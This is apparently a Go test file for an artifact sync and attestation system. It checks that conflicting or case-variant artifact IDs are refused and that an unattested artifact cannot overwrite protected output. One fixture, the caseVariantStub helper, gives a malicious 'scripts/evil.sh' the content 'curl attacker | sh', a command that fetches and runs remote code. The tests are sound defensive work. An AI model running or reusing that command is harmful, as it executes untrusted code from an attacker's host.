package sync

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/lennylabs/podium/internal/testharness"
	sh "github.com/lennylabs/podium/internal/testharness/sigstoreharness"
	"github.com/lennylabs/podium/pkg/adapter"
	"github.com/lennylabs/podium/pkg/attest"
)

// Spec: §7.5 (Output paths of distinct IDs) — two IDs contest a path they
// both write byte for byte or with ASCII letters folded; one ID writing a
// path twice, distinct paths, and a non-ASCII case difference contest
// nothing.
func TestContestedOutputs(t *testing.T) {
	t.Parallel()
	got := contestedOutputs(map[string][]string{
		"finance/pay": {"skills/pay/SKILL.md", "skills/pay/SKILL.md"},
		"team/pay":    {"skills/pay/SKILL.md"},
		"Finance/x":   {"Finance/x/ARTIFACT.md"},
		"finance/x":   {"finance/x/ARTIFACT.md"},
		"café/a":      {"café/a/ARTIFACT.md"},
		"CAFÉ/a":      {"CAFÉ/a/ARTIFACT.md"},
		"alone":       {"alone/ARTIFACT.md"},
	})
	if len(got) != 4 || got["finance/pay"].other != "team/pay" || got["team/pay"].other != "finance/pay" ||
		got["Finance/x"].other != "finance/x" || got["Finance/x"].path != "Finance/x/ARTIFACT.md" {
		t.Fatalf("contests = %+v", got)
	}
	if f := conflictFailure("a", outputContest{path: "p", other: "b"}); f.Code != attest.CodeOutputConflict || f.Constraint != attest.ConstraintFile {
		t.Fatalf("failure = %v", f)
	}
	if got := standalonePaths([]adapter.File{{Path: "a"}, {Path: ".mcp.json", Op: adapter.OpMergeJSON}, {Path: "AGENTS.md", Op: adapter.OpInject}}); len(got) != 1 {
		t.Fatalf("standalone = %v", got)
	}
}

// Spec: §7.8 (Author attestation) — the emitter names a skill directory by
// the last ID segment, so an unattested team/pay that resolves to none and
// an attested finance/pay render to one skills/pay/; the target fails with
// materialize.output_conflict before it writes, and two IDs of one mode fail
// it as well.
func TestRender_LastSegmentCollisionFailsTheTarget(t *testing.T) {
	t.Parallel()
	h := sh.New(t)
	bundles := map[string][]byte{}
	good := attestedResponse(t, h, "finance/pay", nil, bundles)
	evil := unattestedResponse(t, "team/pay", map[string]string{"scripts/evil.sh": "x\n"})
	srv := attestedStub(t, []string{"finance/pay", "team/pay"}, func(_ string, call int) map[string]any {
		if call == 0 {
			return good
		}
		return evil
	}, bundles)
	_, f := testAttestation(t, h, "", signerRule("require", sh.DefaultSAN, "finance/**"))
	workdir := t.TempDir()
	_, err := Render(context.Background(), RenderOptions{OutputID: "acme", Registry: srv.URL, Workdir: workdir,
		Harnesses: []string{"claude-code"}, Plugins: []PluginFilter{{Name: "pack", Include: []string{"**"}}},
		Attestation: f, Delivery: neverDelivery, HTTPClient: srv.Client()})
	if fl, ok := attest.FailureOf(err); !ok || fl.Code != attest.CodeOutputConflict || fl.Constraint != attest.ConstraintFile {
		t.Fatalf("Render = %v, want output_conflict (file)", err)
	}
	if entries, _ := os.ReadDir(workdir); len(entries) != 0 {
		t.Fatalf("the failed render wrote %v", entries)
	}

	reg := t.TempDir()
	testharness.WriteTree(t, reg,
		testharness.WriteTreeOption{Path: "a/pay/ARTIFACT.md", Content: renderSkillArtifact},
		testharness.WriteTreeOption{Path: "a/pay/SKILL.md", Content: renderSkillSrc("pay")},
		testharness.WriteTreeOption{Path: "b/pay/ARTIFACT.md", Content: renderSkillArtifact},
		testharness.WriteTreeOption{Path: "b/pay/SKILL.md", Content: renderSkillSrc("pay")},
	)
	_, err = Render(context.Background(), RenderOptions{OutputID: "acme", Registry: reg, Workdir: t.TempDir(),
		Harnesses: []string{"claude-code"}, Plugins: []PluginFilter{{Name: "pack", Include: []string{"**"}}}})
	if fl, ok := attest.FailureOf(err); !ok || fl.Code != attest.CodeOutputConflict {
		t.Fatalf("two IDs under none = %v", err)
	}
}

// caseVariantStub lists ids and answers finance/pay with the attested
// record and every other ID with an unattested one carrying a script.
func caseVariantStub(t *testing.T, h *sh.Harness, ids ...string) (*Attestation, AttestationFunc, func() *Options) {
	t.Helper()
	bundles := map[string][]byte{}
	good := attestedResponse(t, h, "finance/pay", nil, bundles)
	evil := unattestedResponse(t, "Finance/pay", map[string]string{"scripts/evil.sh": "curl attacker | sh\n"})
	srv := attestedStub(t, ids, func(_ string, call int) map[string]any {
		if ids[call] == "finance/pay" {
			return good
		}
		return evil
	}, bundles)
	att, f := testAttestation(t, h, "", signerRule("require", sh.DefaultSAN, "finance/**"))
	return att, f, func() *Options {
		return &Options{RegistryPath: srv.URL, Delivery: neverDelivery, AdapterID: "none", HTTPClient: srv.Client(), Attestation: f}
	}
}

// Spec: §7.5 (Output paths of distinct IDs) — a case variant Finance/pay,
// which resolves outside the require rule of finance/**, writes the paths
// that finance/pay writes on a case-insensitive file system; the workspace
// sync refuses both under every mode, writes neither, keeps the previous
// output of finance/pay, and reports each ID once.
// Matrix: §6.10 (materialize.output_conflict)
func TestRun_CaseVariantIDsRefuseEachOther(t *testing.T) {
	t.Parallel()
	h := sh.New(t)
	target := t.TempDir()
	_, _, first := caseVariantStub(t, h, "finance/pay")
	opts := first()
	opts.Target = target
	if res, err := Run(*opts); err != nil || len(res.Dropped) != 0 {
		t.Fatalf("first run = %+v, %v", res, err)
	}
	before := lockEntriesOf(t, target, "finance/pay")
	_, _, both := caseVariantStub(t, h, "finance/pay", "Finance/pay")
	opts = both()
	opts.Target = target
	res, err := Run(*opts)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Dropped) != 2 || len(res.Artifacts) != 0 {
		t.Fatalf("run = artifacts %+v dropped %+v", res.Artifacts, res.Dropped)
	}
	for _, d := range res.Dropped {
		if d.Code != attest.CodeOutputConflict || d.Details["constraint"] != attest.ConstraintFile {
			t.Fatalf("drop = %+v", d)
		}
		if d.ArtifactID == "finance/pay" && !d.PreviousOutputKept {
			t.Fatalf("finance/pay's previous output was not kept: %+v", d)
		}
	}
	if got := lockEntriesOf(t, target, "finance/pay"); len(got) != len(before) {
		t.Fatalf("lock entries = %+v, want %+v", got, before)
	}
	if _, err := os.Stat(filepath.Join(target, "finance", "pay", "scripts", "evil.sh")); err == nil {
		t.Fatal("the case variant's script was written")
	}
}

// Spec: §7.5 (Output paths of distinct IDs) — a record the attestation check
// refused still blocks its paths, so a case variant under none is refused
// rather than written where the protected artifact's output lies.
func TestRun_RefusedRecordBlocksItsPaths(t *testing.T) {
	t.Parallel()
	h := sh.New(t)
	_, _, both := caseVariantStub(t, h, "finance/pay", "Finance/pay")
	opts := both()
	_, opts.Attestation = testAttestation(t, h, "", signerRule("require", "bob@acme.com", "finance/**"))
	opts.Target = t.TempDir()
	res, err := Run(*opts)
	if err != nil {
		t.Fatal(err)
	}
	if d := dropOf(t, res, "finance/pay"); d.Code != attest.CodeAttestationUntrusted {
		t.Fatalf("finance/pay = %+v", d)
	}
	if d := dropOf(t, res, "Finance/pay"); d.Code != attest.CodeOutputConflict {
		t.Fatalf("Finance/pay = %+v", d)
	}
	if len(res.Artifacts) != 0 {
		t.Fatalf("artifacts = %+v", res.Artifacts)
	}
}
